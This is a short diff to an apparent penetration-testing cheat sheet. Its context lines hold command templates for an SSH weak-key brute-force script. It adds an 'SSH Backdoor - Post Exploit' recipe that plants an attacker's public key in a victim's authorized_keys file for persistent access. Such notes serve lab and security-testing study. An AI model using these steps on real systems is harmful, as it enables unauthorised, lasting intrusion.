@@ -212,6 +212,20 @@ python 5720 rsa/2048 <IP> <USER> <PORT> <THREADS>
 python 5720 dsa/1024 <IP> <USER> <PORT> <THREADS>
 ```
 
+SSH Backdoor - Post Exploit
+```bash
+# Attacker
+ssh-keygen -f <FILENAME>
+chmod 600 <FILENAME>
+cat <FILENAME>.pub -> copy
+
+# Victim
+echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys
+
+# Connect
+ssh -i <FILENAME> <USER>@<IP>
+```
+
 #### SMTP
 TCP port 25. 
 ```bash
